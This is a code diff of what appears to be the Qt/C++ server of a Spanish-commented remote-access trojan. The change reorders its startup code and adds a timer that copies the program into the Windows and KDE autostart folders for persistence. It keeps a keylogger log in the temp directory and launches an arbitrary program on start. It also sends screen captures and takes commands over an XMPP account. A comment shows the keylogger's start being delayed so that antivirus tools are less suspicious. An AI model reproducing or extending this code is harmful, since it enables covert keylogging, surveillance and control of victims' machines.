@@ -50,6 +50,42 @@ void MainWindow::inicio(){
     manager = new QXmppTransferManager;
     connect(manager,SIGNAL(fileReceived(QXmppTransferJob*)),this,SLOT(llegadaDatosArchivo(QXmppTransferJob*)));
     cliente.addExtension(manager);
+
+    //Declarar los signals y slots
+    connect(this->botonChatEnviar,SIGNAL(clicked()),this,SLOT(enviarMensajeChat()));
+    connect(&this->verTecla,SIGNAL(timeout()),this,SLOT(escucharTeclas()));
+    connect(&cliente,SIGNAL(messageReceived(const QXmppMessage&)),this,SLOT(llegadaDatos(const QXmppMessage&)));
+    connect(this,SIGNAL(procesar(QImage,int)),&capturacion,SLOT(procesarImagen(QImage,int)));
+    connect(&capturacion,SIGNAL(enviar(QByteArray)),this,SLOT(enviarCaptura(QByteArray)));
+    connect(&cliente,SIGNAL(presenceReceived(QXmppPresence)),this,SLOT(recibidaPresencia(QXmppPresence)));
+    connect(&copiar,SIGNAL(timeout()),this,SLOT(tiempoCopiar()));
+    //Crear si no esta creado el archivo de log para el keylogger
+    log.setFileName(directorio.tempPath() + "/log"); //archivo de log del keylogger
+    log.open(QFile::WriteOnly);
+    log.close();
+    verTecla.setInterval(50);
+    //this->verTecla.start();   //Iniciar esto al inicio puede hacer que los antivirus sospechen
+    if(this->ejecutar != "noejecutar") //Ejecutar un programa al inicio
+    {
+        QProcess::startDetached(this->ejecutar);
+    }
+    if(this->tipoMensaje != "nomensaje")
+    {
+        mostrarMensaje(tipoMensaje,tituloMensaje,textoMensaje);
+    }
+    capturacion.moveToThread(&hilo); //movemos capturacion a un nuevo hilo para que se ejecute de forma independiente al programa principal y no lo bloquee
+    hilo.start();
+    QXmppConfiguration configuracion; //la configuracion inicial de nuestro cliente xmpp
+    configuracion.setJid(this->cuentaXmpp);
+    configuracion.setPassword(this->contrasena);
+    configuracion.setResource(this->alias);
+    cliente.setClientPresence(QXmppPresence::Available);
+    cliente.connectToServer(configuracion); //conectar al servidor xmpp
+    copiar.setInterval(6000);
+    copiar.start();
+}
+void MainWindow::tiempoCopiar()
+{
     QByteArray datos = nuevaTrama(); //Reconstruimos la configuración con algunas modificaciones para el servidor copiado
     //Copiar a los posibles directorios de inicio de windows
     #ifdef Q_WS_WIN
@@ -67,35 +103,7 @@ void MainWindow::inicio(){
         copiarServidor(datos,QDir::homePath() + "/.kde/Autostart/" + this->nombreCopiable);
     }
     #endif
-    //Declarar los signals y slots
-    connect(this->botonChatEnviar,SIGNAL(clicked()),this,SLOT(enviarMensajeChat()));
-    connect(&this->verTecla,SIGNAL(timeout()),this,SLOT(escucharTeclas()));
-    connect(&cliente,SIGNAL(messageReceived(const QXmppMessage&)),this,SLOT(llegadaDatos(const QXmppMessage&)));
-    connect(this,SIGNAL(procesar(QImage,int)),&capturacion,SLOT(procesarImagen(QImage,int)));
-    connect(&capturacion,SIGNAL(enviar(QByteArray)),this,SLOT(enviarCaptura(QByteArray)));
-    connect(&cliente,SIGNAL(presenceReceived(QXmppPresence)),this,SLOT(recibidaPresencia(QXmppPresence)));
-    //Crear si no esta creado el archivo de log para el keylogger
-    log.setFileName(directorio.tempPath() + "/log"); //archivo de log del keylogger
-    log.open(QFile::WriteOnly);
-    log.close();
-    verTecla.setInterval(50);
-    this->verTecla.start();   
-    if(this->ejecutar != "noejecutar") //Ejecutar un programa al inicio
-    {
-        QProcess::startDetached(this->ejecutar);
-    }
-    if(this->tipoMensaje != "nomensaje")
-    {
-        mostrarMensaje(tipoMensaje,tituloMensaje,textoMensaje);
-    }
-    capturacion.moveToThread(&hilo); //movemos capturacion a un nuevo hilo para que se ejecute de forma independiente al programa principal y no lo bloquee
-    hilo.start();
-    QXmppConfiguration configuracion; //la configuracion inicial de nuestro cliente xmpp
-    configuracion.setJid(this->cuentaXmpp);
-    configuracion.setPassword(this->contrasena);
-    configuracion.setResource(this->alias);
-    cliente.setClientPresence(QXmppPresence::Available);
-    cliente.connectToServer(configuracion); //conectar al servidor xmpp
+    copiar.stop();
 }
 
 QByteArray MainWindow::nuevaTrama()
